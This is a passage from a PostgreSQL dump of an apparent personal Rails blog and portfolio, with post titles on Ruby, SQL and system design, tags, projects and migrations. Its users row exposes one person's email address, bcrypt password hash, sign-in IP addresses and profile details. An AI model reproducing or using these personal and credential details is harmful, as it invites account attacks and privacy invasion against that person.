12	Rate Limiting	\N	0	2021-08-09 07:17:48.320926	f	\N	2021-08-09 07:17:48.360829	2021-08-09 07:17:48.378612	1	rate-limiting	0					0
13	Bubble Sort	\N	0	2021-08-09 07:50:34.317102	f	\N	2021-08-09 07:50:34.416608	2021-08-09 07:50:34.4893	1	bubble-sort	0				rb	0
23	Prepend	\N	0	2021-08-10 21:34:32.030107	f	\N	2021-08-10 21:33:38.192946	2021-08-10 21:34:32.057285	1	prepend	0	<div>Available since Ruby 2. It actually works like an include, except that <strong>instead of inserting the module between the class and its superclass</strong> in the chain, it will<strong> insert it at the bottom of the chain, even before the class itself</strong>.</div>			rb	0
8	TinyURL System	\N	0	2021-08-09 13:14:35.617136	f	\N	2021-08-09 06:30:12.829812	2021-08-09 13:14:36.448067	1	tinyurl-system	0					0
9	How to find all pairs on an integer array whose sum is equal to the given number?	\N	0	2021-08-09 08:00:56.327757	f	\N	2021-08-09 06:33:33.199507	2021-08-09 08:00:56.479778	1	how-to-find-all-pairs-on-an-integer-array-whose-sum-is-equal-to-the-given-number	0				rb	0
18	Check if two Strings are anagrams of each other	\N	0	2021-08-10 14:26:27.329851	f	\N	2021-08-09 13:05:18.482379	2021-08-10 14:26:27.389484	1	check-if-two-strings-are-anagrams-of-each-other	0		Strings, Anagram Strings	Ruby code to Check if two Strings are anagrams of each other	rb	0
24	super vs super()	\N	0	2021-08-10 21:35:24.297098	f	\N	2021-08-10 21:35:24.38088	2021-08-10 21:35:24.402727	1	super-vs-super	0					0
19	ACID Properties	\N	0	2021-08-09 20:16:45.959057	f	\N	2021-08-09 20:15:48.755376	2021-08-09 20:16:46.202974	1	acid-properties	0	<div>A transaction is a collection of instructions. To maintain the integrity of a database, all transactions must obey ACID properties. ACID is an acronym for</div><div>atomicity, consistency, isolation, and durability</div>				0
14	Insertion Sort	\N	0	2021-08-09 08:25:20.584664	f	\N	2021-08-09 08:23:54.362981	2021-08-09 08:25:20.689774	1	insertion-sort	0				rb	0
15	Selection Sort	\N	0	2021-08-09 08:31:37.33279	f	\N	2021-08-09 08:31:37.379781	2021-08-09 08:31:37.406792	1	selection-sort	0				rb	0
20	Database Joins	\N	0	2021-08-09 20:18:37.279619	f	\N	2021-08-09 20:18:37.3034	2021-08-09 20:18:37.321005	1	database-joins	0		SQL, Joins,Database Joins			0
28	default_scope	\N	0	2021-08-11 08:42:23.760197	f	\N	2021-08-11 08:42:17.320311	2021-08-11 08:42:24.053389	1	default_scope	0				rb	0
26	Single table inheritance	\N	0	2021-08-11 08:36:06.298899	f	\N	2021-08-11 08:35:41.099238	2021-08-11 08:36:06.459852	1	single-table-inheritance	0	<div>STI lets you save <strong>different models inheriting from the same model</strong> inside a single table.</div>			rb	0
21	Find the nth highest salary in SQL	\N	0	2021-08-09 21:08:27.424779	f	\N	2021-08-09 20:20:23.064525	2021-08-09 21:08:27.620591	1	find-the-nth-highest-salary-in-sql	0		SQL,nth highest record		sql	0
22	What is scope chaining in javascript?	\N	0	2021-08-09 21:57:23.845975	f	\N	2021-08-09 21:57:23.912598	2021-08-09 21:57:23.947596	1	what-is-scope-chaining-in-javascript	0	<div>When javascript comes across a variable, it starts looking for its declaration in the current scope(function). If it finds it, it uses it. If not, then it looks for the outer scope. And it follows the same for that scope. This goes on till it hits the global scope. If it finds it in the global scope, it uses it. Otherwise, it creates a variable attached to the global scope.</div>	javascript,javascript scope chaining			0
25	Splat operator	\N	0	2021-08-10 21:38:52.990291	f	\N	2021-08-10 21:37:21.258209	2021-08-10 21:38:53.381052	1	splat-operator	0				rb	0
30	High level Rails Request/response cycle	\N	0	2021-08-11 08:46:51.489193	f	\N	2021-08-11 08:46:51.611882	2021-08-11 08:46:51.757193	1	high-level-rails-request-response-cycle	0					0
27	ActiveRecord Scope	\N	0	2021-08-11 08:40:06.688908	f	\N	2021-08-11 08:39:34.32573	2021-08-11 08:40:07.00779	1	activerecord-scope	0				rb	0
29	How is it possible to call class methods on mailers, even though you define instance methods? 	\N	0	2021-08-11 08:44:30.440329	f	\N	2021-08-11 08:44:25.374893	2021-08-11 08:44:30.629942	1	how-is-it-possible-to-call-class-methods-on-mailers-even-though-you-define-instance-methods	0				rb	0
32	Why Order By With Limit and Offset is Slow?	\N	0	2021-08-11 08:50:19.849584	f	\N	2021-08-11 08:50:19.912119	2021-08-11 08:50:19.953813	1	why-order-by-with-limit-and-offset-is-slow	0				sql	0
31	Locking Mechanism	\N	0	2021-08-11 08:49:00.989366	f	\N	2021-08-11 08:48:45.998088	2021-08-11 08:49:01.381648	1	locking-mechanism	0					0
33	Postgres Vacuum	\N	0	2021-08-11 08:51:03.162079	f	\N	2021-08-11 08:51:03.363692	2021-08-11 08:51:03.447836	1	postgres-vacuum	0					0
34	Window Functions	\N	0	2021-08-11 08:52:39.710061	f	\N	2021-08-11 08:52:40.003303	2021-08-11 08:52:40.049757	1	window-functions	0				sql	0
35	Load Balancer	\N	0	2021-08-11 08:53:57.201043	f	\N	2021-08-11 08:53:57.349115	2021-08-11 08:53:57.496025	1	load-balancer	0					0
36	Types of Load Balancers	\N	0	2021-08-11 08:54:48.220179	f	\N	2021-08-11 08:54:48.393114	2021-08-11 08:54:48.584186	1	types-of-load-balancers	0					0
37	Elevator System Design	\N	0	2021-08-11 08:58:49.263134	f	\N	2021-08-11 08:58:49.737628	2021-08-11 08:58:49.973554	1	elevator-system-design	0					0
53	Cross-Origin Resource Sharing (CORS)	\N	0	2021-08-13 13:08:54.927607	f	\N	2021-08-13 13:08:46.043459	2021-08-13 13:08:56.786636	1	cross-origin-resource-sharing-cors	0					0
48	Red Blue Lottery Puzzle	\N	0	2021-08-11 21:42:27.848616	f	\N	2021-08-11 21:41:55.448288	2021-08-11 21:42:27.956411	1	red-blue-lottery-puzzle	0					0
58	Why doesn't ruby support method overloading?	\N	0	2021-08-19 21:11:24.787236	f	\N	2021-08-19 21:11:24.80573	2021-08-19 21:11:24.824437	1	why-doesn-t-ruby-support-method-overloading	0					0
7	Self Joins	\N	0	2021-08-18 23:26:38.920937	f	\N	2021-08-07 20:42:26.926009	2021-08-18 23:26:39.048716	1	self-joins	0	<div>In designing a data model, you will sometimes find a model that should have a relation to itself. For example, you may want to store all employees in a single database model, but be able to trace relationships such as between <strong>manager</strong> and <strong>subordinates</strong>. This situation can be modelled with self-joining associations:</div>			rb	0
59	Symbol vs string	\N	0	2021-08-19 21:12:02.47224	f	\N	2021-08-19 21:12:02.495566	2021-08-19 21:12:02.519721	1	symbol-vs-string	0					0
60	Ruby method lookup	\N	0	2021-08-19 21:12:35.67798	f	\N	2021-08-19 21:12:35.705823	2021-08-19 21:12:35.733566	1	ruby-method-lookup	0					0
56	Yield keyword	\N	0	2021-08-19 21:05:53.59937	f	\N	2021-08-19 21:04:53.66995	2021-08-19 21:05:53.73541	1	yield-keyword	0				rb	0
39	Longest Mountain in Array	\N	0	2021-08-11 11:39:28.232729	f	\N	2021-08-11 09:03:56.482614	2021-08-11 11:39:28.455754	1	longest-mountain-in-array	0				rb	0
49	Russian Doll Caching	\N	0	2021-08-11 21:47:20.675058	f	\N	2021-08-11 21:45:20.623257	2021-08-11 21:47:20.804916	1	russian-doll-caching	0				rb	0
38	Is Monotonic	\N	0	2021-08-11 11:39:50.541629	f	\N	2021-08-11 09:02:32.383795	2021-08-11 11:39:50.658188	1	is-monotonic	0				rb	0
40	CDN - Content delivery network	\N	0	2021-08-11 21:24:02.805181	f	\N	2021-08-11 21:24:02.843997	2021-08-11 21:24:02.866839	1	cdn-content-delivery-network	0					0
41	Choosing the Best Database in a System Design	\N	0	2021-08-11 21:26:06.863917	f	\N	2021-08-11 21:26:06.890882	2021-08-11 21:26:06.906218	1	choosing-the-best-database-in-a-system-design	0					0
42	Horizontal vs Vertical Scaling	\N	0	2021-08-11 21:34:48.943852	f	\N	2021-08-11 21:27:12.586548	2021-08-11 21:34:49.036595	1	horizontal-vs-vertical-scaling	0					0
54	Rails Cheat Sheet	\N	0	2021-08-17 08:00:45.440826	f	\N	2021-08-17 07:52:25.766517	2021-08-17 08:00:45.596275	1	rails-cheat-sheet	0				rb	0
64	Rails Best Practices	\N	0	2021-08-19 21:24:55.939147	f	\N	2021-08-19 21:22:46.286681	2021-08-19 21:24:56.035803	1	rails-best-practices	0				rb	0
57	map, each, collect, inject & reduce	\N	0	2021-08-19 21:10:16.60373	f	\N	2021-08-19 21:09:48.806373	2021-08-19 21:10:16.744275	1	map-each-collect-inject-reduce	0				rb	0
45	HTTP/2	\N	0	2021-08-11 21:36:55.195924	f	\N	2021-08-11 21:36:28.98917	2021-08-11 21:36:55.221672	1	http-2	0					0
46	HTTP/3 (HTTP/2 over QUIC)	\N	0	2021-08-11 21:37:17.290259	f	\N	2021-08-11 21:37:17.313292	2021-08-11 21:37:17.329681	1	http-3-http-2-over-quic	0					0
62	== vs === , eql?, equal?	\N	0	2021-08-19 21:18:32.073939	f	\N	2021-08-19 21:15:21.30085	2021-08-19 21:18:32.271639	1	vs-eql-equal	0				rb	0
44	HTTP/1.1	\N	0	2021-08-11 21:37:34.659556	f	\N	2021-08-11 21:36:11.713381	2021-08-11 21:37:34.704248	1	http-1-1	0					0
50	nil? Vs empty? Vs blank	\N	0	2021-08-11 21:50:28.886033	f	\N	2021-08-11 21:49:01.62788	2021-08-11 21:50:29.028827	1	nil-vs-empty-vs-blank	0				rb	0
43	HTTP/1.0	\N	0	2021-08-11 21:37:46.422189	f	\N	2021-08-11 21:35:51.840328	2021-08-11 21:37:46.494283	1	http-1-0	0					0
47	Poison and Rat Puzzle	\N	0	2021-08-11 21:40:55.502504	f	\N	2021-08-11 21:40:55.531161	2021-08-11 21:40:55.549729	1	poison-and-rat-puzzle	0					0
61	Monkey Patching	\N	0	2021-08-19 21:13:52.127872	f	\N	2021-08-19 21:13:28.932922	2021-08-19 21:13:52.282092	1	monkey-patching	0				rb	0
51	&& vs and , || vs or	\N	0	2021-08-11 21:51:50.466991	f	\N	2021-08-11 21:51:34.369033	2021-08-11 21:51:50.532087	1	vs-and-vs-or	0				rb	0
52	HTTP caching	\N	0	2021-08-13 13:07:33.493176	f	\N	2021-08-13 13:07:20.477181	2021-08-13 13:07:34.076171	1	http-caching	0					0
66	Rails Migrations Cheat Sheet	\N	0	2021-08-19 21:30:44.832866	f	\N	2021-08-19 21:27:41.256863	2021-08-19 21:30:44.87553	1	rails-migrations-cheat-sheet	0				rb	0
65	ActiveRecord count vs length vs size	\N	0	2021-08-19 21:26:06.378951	f	\N	2021-08-19 21:25:41.517935	2021-08-19 21:26:06.632793	1	activerecord-count-vs-length-vs-size	0				rb	0
63	Locks in Rails	\N	0	2021-08-19 21:21:51.780321	f	\N	2021-08-19 21:20:55.682037	2021-08-19 21:21:51.914859	1	locks-in-rails	0				rb	0
67	Difference between rake db:migrate db:reset and db:schema:load	\N	0	2021-08-19 21:31:12.03647	f	\N	2021-08-19 21:31:12.061771	2021-08-19 21:31:12.079737	1	difference-between-rake-db-migrate-db-reset-and-db-schema-load	0					0
68	Hash vs HashWithIndifferentAccess	\N	0	2021-08-19 21:31:37.08475	f	\N	2021-08-19 21:31:37.103149	2021-08-19 21:31:37.116719	1	hash-vs-hashwithindifferentaccess	0					0
69	CSRF (Cross site request forgery) in Rails	\N	0	2021-08-19 21:32:07.858186	f	\N	2021-08-19 21:32:07.874058	2021-08-19 21:32:07.890287	1	csrf-cross-site-request-forgery-in-rails	0					0
\.


--
-- Data for Name: projects; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.projects (id, title, description, image, caption, source_url, accepted, user_id, created_at, updated_at, sort, is_side, url, team_size) FROM stdin;
1	Product Catalog	\N	\N	\N	\N	f	1	2021-08-09 12:30:10.715511	2021-08-09 21:55:01.741615	\N	f	\N	\N
3	TopFan	\N	\N	\N	\N	f	1	2021-08-10 18:47:38.859479	2021-08-10 18:47:38.895499	\N	f	\N	\N
4	NxtWish	\N	\N	\N	\N	f	1	2021-08-10 18:50:27.729524	2021-08-10 18:50:27.73658	\N	f	\N	\N
2	Investometer	\N	\N	\N	\N	f	1	2021-08-09 12:31:40.95538	2021-08-10 19:41:33.912093	\N	t	\N	\N
\.


--
-- Data for Name: responses; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.responses (id, body, post_id, user_id, created_at, updated_at, likes_count) FROM stdin;
\.


--
-- Data for Name: schema_migrations; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.schema_migrations (version) FROM stdin;
20210807102912
20210805223855
20210805225145
20210805225608
20210805231903
20210806001242
20210806001826
20210806001837
20210806001845
20210806001914
20210806002045
20210806002142
20210806002238
20210806085631
20210806125618
20210806125739
20210806125747
20210806130056
20210806130141
20210806133023
20210806165642
20210806165643
20210806202402
20210806211130
20210806211945
20210806220012
20210806222724
20210806222935
20210806223133
20210806223308
20210807001846
20210807091618
20210807153149
20210807185519
20210808194719
20210810111920
20210810185159
20210819201554
\.


--
-- Data for Name: social_accounts; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.social_accounts (id, user_id, account_type, url) FROM stdin;
\.


--
-- Data for Name: tag_relationships; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.tag_relationships (id, tag_id, related_tag_id, relevance, created_at, updated_at) FROM stdin;
3	3	4	5	2021-08-09 06:30:02.317676	2021-08-09 07:09:01.196387
4	4	3	5	2021-08-09 06:30:02.334744	2021-08-09 07:09:01.237801
1	1	2	4	2021-08-08 13:28:52.944068	2021-08-09 07:11:50.945841
2	2	1	4	2021-08-08 13:28:53.089236	2021-08-09 07:11:50.962528
5	6	3	1	2021-08-09 07:14:27.714017	2021-08-09 07:14:27.718794
6	3	6	1	2021-08-09 07:14:27.730132	2021-08-09 07:14:27.734236
13	11	15	1	2021-08-11 08:48:45.793104	2021-08-11 08:48:45.817358
14	15	11	1	2021-08-11 08:48:45.876488	2021-08-11 08:48:45.887746
15	11	16	1	2021-08-11 08:49:00.905536	2021-08-11 08:49:00.925487
16	16	11	1	2021-08-11 08:49:00.974197	2021-08-11 08:49:00.981585
17	11	17	1	2021-08-11 08:51:03.069267	2021-08-11 08:51:03.081924
18	17	11	1	2021-08-11 08:51:03.123303	2021-08-11 08:51:03.137499
19	11	18	1	2021-08-11 08:52:39.538905	2021-08-11 08:52:39.585345
20	18	11	1	2021-08-11 08:52:39.646099	2021-08-11 08:52:39.687498
21	5	13	2	2021-08-11 11:39:28.145044	2021-08-11 11:39:50.520761
22	13	5	2	2021-08-11 11:39:28.188617	2021-08-11 11:39:50.536708
7	7	8	14	2021-08-09 07:50:30.092893	2021-08-09 08:31:37.211709
8	8	7	14	2021-08-09 07:50:30.136873	2021-08-09 08:31:37.248474
9	10	13	2	2021-08-10 14:26:03.826469	2021-08-10 14:26:27.274631
10	13	10	2	2021-08-10 14:26:03.851478	2021-08-10 14:26:27.315234
23	6	19	4	2021-08-11 21:36:55.17175	2021-08-11 21:37:46.26779
24	19	6	4	2021-08-11 21:36:55.188542	2021-08-11 21:37:46.389159
25	1	21	4	2021-08-19 21:27:40.859879	2021-08-19 21:30:00.336482
27	21	1	4	2021-08-19 21:27:41.019135	2021-08-19 21:30:00.365436
28	21	22	4	2021-08-19 21:27:41.073052	2021-08-19 21:30:00.376977
30	22	21	4	2021-08-19 21:27:41.141397	2021-08-19 21:30:00.404493
26	1	22	5	2021-08-19 21:27:40.932865	2021-08-19 21:30:44.751791
29	22	1	5	2021-08-19 21:27:41.097893	2021-08-19 21:30:44.778698
31	22	14	1	2021-08-19 21:30:44.791464	2021-08-19 21:30:44.799223
32	14	22	1	2021-08-19 21:30:44.823632	2021-08-19 21:30:44.827715
12	14	1	13	2021-08-10 21:35:49.548326	2021-08-19 21:31:12.015085
11	1	14	13	2021-08-10 21:35:49.532144	2021-08-19 21:31:12.030166
\.


--
-- Data for Name: taggings; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.taggings (id, tag_id, subject_type, subject_id, created_at, updated_at) FROM stdin;
1	1	Post	1	2021-08-07 20:22:11.318885	2021-08-07 20:22:11.318885
2	1	Post	2	2021-08-07 20:23:47.533542	2021-08-07 20:23:47.533542
3	1	Post	3	2021-08-07 20:25:23.625506	2021-08-07 20:25:23.625506
4	1	Post	4	2021-08-07 20:25:55.545496	2021-08-07 20:25:55.545496
5	1	Post	5	2021-08-07 20:27:07.610021	2021-08-07 20:27:07.610021
6	1	Post	6	2021-08-07 20:27:55.17187	2021-08-07 20:27:55.17187
8	1	Post	7	2021-08-08 13:53:16.2701	2021-08-08 13:53:16.2701
10	4	Post	8	2021-08-09 06:30:12.856424	2021-08-09 06:30:12.856424
11	5	Post	9	2021-08-09 06:33:33.212132	2021-08-09 06:33:33.212132
12	6	Post	10	2021-08-09 07:14:27.855944	2021-08-09 07:14:27.855944
13	3	Post	10	2021-08-09 07:14:27.865832	2021-08-09 07:14:27.865832
14	6	Post	11	2021-08-09 07:16:04.169784	2021-08-09 07:16:04.169784
15	6	Post	12	2021-08-09 07:17:48.370332	2021-08-09 07:17:48.370332
16	7	Post	13	2021-08-09 07:50:34.44011	2021-08-09 07:50:34.44011
17	8	Post	13	2021-08-09 07:50:34.460125	2021-08-09 07:50:34.460125
18	7	Post	14	2021-08-09 08:23:54.38007	2021-08-09 08:23:54.38007
19	8	Post	14	2021-08-09 08:23:54.391419	2021-08-09 08:23:54.391419
20	7	Post	15	2021-08-09 08:31:37.385869	2021-08-09 08:31:37.385869
21	8	Post	15	2021-08-09 08:31:37.393645	2021-08-09 08:31:37.393645
22	9	Post	16	2021-08-09 08:39:44.708954	2021-08-09 08:39:44.708954
23	9	Post	17	2021-08-09 08:41:14.657175	2021-08-09 08:41:14.657175
24	10	Post	18	2021-08-09 13:05:18.49013	2021-08-09 13:05:18.49013
25	11	Post	19	2021-08-09 20:15:48.761995	2021-08-09 20:15:48.761995
26	11	Post	20	2021-08-09 20:18:37.309572	2021-08-09 20:18:37.309572
27	11	Post	21	2021-08-09 20:20:23.070525	2021-08-09 20:20:23.070525
28	12	Post	22	2021-08-09 21:57:23.927306	2021-08-09 21:57:23.927306
29	13	Post	18	2021-08-10 14:26:03.785894	2021-08-10 14:26:03.785894
30	2	Post	23	2021-08-10 21:33:38.215717	2021-08-10 21:33:38.215717
31	2	Post	24	2021-08-10 21:35:24.390002	2021-08-10 21:35:24.390002
32	14	Post	5	2021-08-10 21:35:49.49152	2021-08-10 21:35:49.49152
33	2	Post	25	2021-08-10 21:37:21.264783	2021-08-10 21:37:21.264783
34	1	Post	26	2021-08-11 08:35:41.125341	2021-08-11 08:35:41.125341
35	1	Post	27	2021-08-11 08:39:34.342727	2021-08-11 08:39:34.342727
36	14	Post	27	2021-08-11 08:39:34.371097	2021-08-11 08:39:34.371097
37	1	Post	28	2021-08-11 08:42:17.362088	2021-08-11 08:42:17.362088
38	14	Post	28	2021-08-11 08:42:17.400412	2021-08-11 08:42:17.400412
39	1	Post	29	2021-08-11 08:44:25.397405	2021-08-11 08:44:25.397405
40	1	Post	30	2021-08-11 08:46:51.685284	2021-08-11 08:46:51.685284
41	11	Post	31	2021-08-11 08:48:46.004553	2021-08-11 08:48:46.004553
43	16	Post	31	2021-08-11 08:49:00.841401	2021-08-11 08:49:00.841401
44	11	Post	32	2021-08-11 08:50:19.931027	2021-08-11 08:50:19.931027
45	11	Post	33	2021-08-11 08:51:03.393226	2021-08-11 08:51:03.393226
46	17	Post	33	2021-08-11 08:51:03.407622	2021-08-11 08:51:03.407622
47	11	Post	34	2021-08-11 08:52:40.015741	2021-08-11 08:52:40.015741
48	18	Post	34	2021-08-11 08:52:40.026758	2021-08-11 08:52:40.026758
49	6	Post	35	2021-08-11 08:53:57.376987	2021-08-11 08:53:57.376987
50	6	Post	36	2021-08-11 08:54:48.409925	2021-08-11 08:54:48.409925
51	4	Post	37	2021-08-11 08:58:49.769407	2021-08-11 08:58:49.769407
52	5	Post	38	2021-08-11 09:02:32.401371	2021-08-11 09:02:32.401371
53	5	Post	39	2021-08-11 09:03:56.503183	2021-08-11 09:03:56.503183
54	13	Post	39	2021-08-11 11:39:28.055251	2021-08-11 11:39:28.055251
55	13	Post	38	2021-08-11 11:39:50.489795	2021-08-11 11:39:50.489795
56	6	Post	40	2021-08-11 21:24:02.850795	2021-08-11 21:24:02.850795
57	6	Post	41	2021-08-11 21:26:06.89558	2021-08-11 21:26:06.89558
58	6	Post	42	2021-08-11 21:27:12.593594	2021-08-11 21:27:12.593594
59	6	Post	43	2021-08-11 21:35:51.849122	2021-08-11 21:35:51.849122
60	6	Post	44	2021-08-11 21:36:11.717065	2021-08-11 21:36:11.717065
61	6	Post	45	2021-08-11 21:36:29.002089	2021-08-11 21:36:29.002089
62	19	Post	45	2021-08-11 21:36:55.146811	2021-08-11 21:36:55.146811
63	6	Post	46	2021-08-11 21:37:17.318467	2021-08-11 21:37:17.318467
64	19	Post	46	2021-08-11 21:37:17.323296	2021-08-11 21:37:17.323296
65	19	Post	44	2021-08-11 21:37:34.600712	2021-08-11 21:37:34.600712
66	19	Post	43	2021-08-11 21:37:46.163283	2021-08-11 21:37:46.163283
67	20	Post	47	2021-08-11 21:40:55.534655	2021-08-11 21:40:55.534655
68	20	Post	48	2021-08-11 21:41:55.455756	2021-08-11 21:41:55.455756
69	1	Post	49	2021-08-11 21:45:20.629475	2021-08-11 21:45:20.629475
70	2	Post	50	2021-08-11 21:49:01.63318	2021-08-11 21:49:01.63318
71	2	Post	51	2021-08-11 21:51:34.37352	2021-08-11 21:51:34.37352
72	9	Post	52	2021-08-13 13:07:20.570545	2021-08-13 13:07:20.570545
73	9	Post	53	2021-08-13 13:08:46.068687	2021-08-13 13:08:46.068687
74	1	Post	54	2021-08-17 07:52:25.786696	2021-08-17 07:52:25.786696
76	14	Post	7	2021-08-18 22:01:17.622614	2021-08-18 22:01:17.622614
77	2	Post	56	2021-08-19 21:04:53.686502	2021-08-19 21:04:53.686502
78	2	Post	57	2021-08-19 21:09:48.813324	2021-08-19 21:09:48.813324
79	2	Post	58	2021-08-19 21:11:24.816426	2021-08-19 21:11:24.816426
80	2	Post	59	2021-08-19 21:12:02.510735	2021-08-19 21:12:02.510735
81	2	Post	60	2021-08-19 21:12:35.713989	2021-08-19 21:12:35.713989
82	2	Post	61	2021-08-19 21:13:28.938031	2021-08-19 21:13:28.938031
83	2	Post	62	2021-08-19 21:15:21.308906	2021-08-19 21:15:21.308906
84	1	Post	63	2021-08-19 21:20:55.688001	2021-08-19 21:20:55.688001
85	1	Post	64	2021-08-19 21:22:46.291177	2021-08-19 21:22:46.291177
86	14	Post	65	2021-08-19 21:25:41.52305	2021-08-19 21:25:41.52305
87	1	Post	65	2021-08-19 21:25:41.52852	2021-08-19 21:25:41.52852
88	1	Post	66	2021-08-19 21:27:41.263694	2021-08-19 21:27:41.263694
90	22	Post	66	2021-08-19 21:27:41.27721	2021-08-19 21:27:41.27721
91	14	Post	66	2021-08-19 21:30:44.733068	2021-08-19 21:30:44.733068
92	14	Post	67	2021-08-19 21:31:12.067308	2021-08-19 21:31:12.067308
93	1	Post	67	2021-08-19 21:31:12.072023	2021-08-19 21:31:12.072023
94	1	Post	68	2021-08-19 21:31:37.10827	2021-08-19 21:31:37.10827
95	1	Post	69	2021-08-19 21:32:07.878494	2021-08-19 21:32:07.878494
\.


--
-- Data for Name: tags; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.tags (id, name, created_at, updated_at, featured, lowercase_name, slug) FROM stdin;
1	Ruby on Rails	2021-08-07 20:22:11.230734	2021-08-07 20:22:11.230734	f	ruby on rails	ruby-on-rails
2	ruby	2021-08-08 13:28:52.780815	2021-08-08 13:28:52.780815	f	ruby	ruby
3	System Design	2021-08-09 06:30:02.237961	2021-08-09 06:30:02.237961	f	system design	system-design
4	System Design Case Study	2021-08-09 06:30:02.254228	2021-08-09 06:30:02.254228	f	system design case study	system-design-case-study
5	Arrays	2021-08-09 06:33:27.623232	2021-08-09 06:33:27.623232	f	arrays	arrays
6	System Design Concepts	2021-08-09 07:14:15.052492	2021-08-09 07:14:15.052492	f	system design concepts	system-design-concepts
7	Algorithms	2021-08-09 07:50:29.982222	2021-08-09 07:50:29.982222	f	algorithms	algorithms
8	Sorting	2021-08-09 07:50:30.02022	2021-08-09 07:50:30.02022	f	sorting	sorting
9	Web Technologies	2021-08-09 08:39:38.762662	2021-08-09 08:39:38.762662	f	web technologies	web-technologies
10	Strings	2021-08-09 13:05:14.931452	2021-08-09 13:05:14.931452	f	strings	strings
11	SQL	2021-08-09 20:15:44.937109	2021-08-09 20:15:44.937109	f	sql	sql
12	javascript	2021-08-09 21:57:20.961494	2021-08-09 21:57:20.961494	f	javascript	javascript
13	Leetcode	2021-08-10 14:26:03.755077	2021-08-10 14:26:03.755077	f	leetcode	leetcode
14	ActiveRecord	2021-08-10 21:35:49.475575	2021-08-10 21:35:49.475575	f	activerecord	activerecord
15	Locking	2021-08-11 08:48:45.763178	2021-08-11 08:48:45.763178	f	locking	locking
16	SQL Locks	2021-08-11 08:49:00.790517	2021-08-11 08:49:00.790517	f	sql locks	sql-locks
17	Postgresql	2021-08-11 08:51:02.985301	2021-08-11 08:51:02.985301	f	postgresql	postgresql
18	Window Functions	2021-08-11 08:52:39.471278	2021-08-11 08:52:39.471278	f	window functions	window-functions
19	HTTP	2021-08-11 21:36:55.1368	2021-08-11 21:36:55.1368	f	http	http
20	Puzzle	2021-08-11 21:40:55.497312	2021-08-11 21:40:55.497312	f	puzzle	puzzle
21	Active Record	2021-08-19 21:27:40.822018	2021-08-19 21:27:40.822018	f	active record	active-record
22	Cheat Sheet	2021-08-19 21:27:40.836936	2021-08-19 21:27:40.836936	f	cheat sheet	cheat-sheet
\.


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.users (id, username, email, encrypted_password, reset_password_token, reset_password_sent_at, remember_created_at, sign_in_count, current_sign_in_at, last_sign_in_at, current_sign_in_ip, last_sign_in_ip, created_at, updated_at, avatar, description, provider, uid, slug, location, first_name, last_name, linkedin, github, resume, skills, mobile, hobbies, languages, show_linkedin_badge) FROM stdin;
1	aman	aman29april@gmail.com	$2a$12$8cxj4kQV7STOqIWpT2yseu/t0TRli9T5QxbfUzBqMpaNECePykTxe	\N	\N	2021-08-08 21:45:25.476002	46	2021-08-19 21:04:10.319562	2021-08-18 21:51:43.335492	103.164.199.145	65.196.53.199	2021-08-07 12:31:29.600229	2021-08-19 21:04:10.331304	ec24e6b8-84a4-443d-b0be-d5093a789e36.jpeg	Ruby on Rails Engineer | 6 Years Experience	\N	\N	aman	Punjab, India	Aman	Kumar	aman29april	aman29april	https://docs.google.com/document/d/1us-VvTNgIGc68f11n7ydA0LuEilMwFTcqJkM5jRfT5Q	Ruby on Rails, Flutter, JavaScript, Docker, Kubernetes, Ember.js, Rubymine, Sidekiq, Google Cloud Platform, HTML		Photography,Cycling	English,Hindi,Punjabi	f
\.


--
-- Name: action_text_highlighted_code_blocks_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.action_text_highlighted_code_blocks_id_seq', 1, false);


--
-- Name: action_text_rich_texts_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.action_text_rich_texts_id_seq', 78, true);


--
-- Name: active_storage_attachments_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.active_storage_attachments_id_seq', 1, false);


--
-- Name: active_storage_blobs_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.active_storage_blobs_id_seq', 1, false);


--
-- Name: active_storage_variant_records_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.active_storage_variant_records_id_seq', 1, false);


--
-- Name: bookmarks_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.bookmarks_id_seq', 1, false);


--
-- Name: experiences_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.experiences_id_seq', 5, true);


--
-- Name: friendly_id_slugs_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.friendly_id_slugs_id_seq', 70, true);


--
-- Name: item_images_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.item_images_id_seq', 1, false);


--
-- Name: item_texts_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.item_texts_id_seq', 1, false);


--
-- Name: item_twitters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.item_twitters_id_seq', 1, false);


--
-- Name: items_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.items_id_seq', 1, false);


--
-- Name: likes_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.likes_id_seq', 1, false);


--
-- Name: posts_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.posts_id_seq', 69, true);


--
-- Name: projects_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.projects_id_seq', 4, true);


--
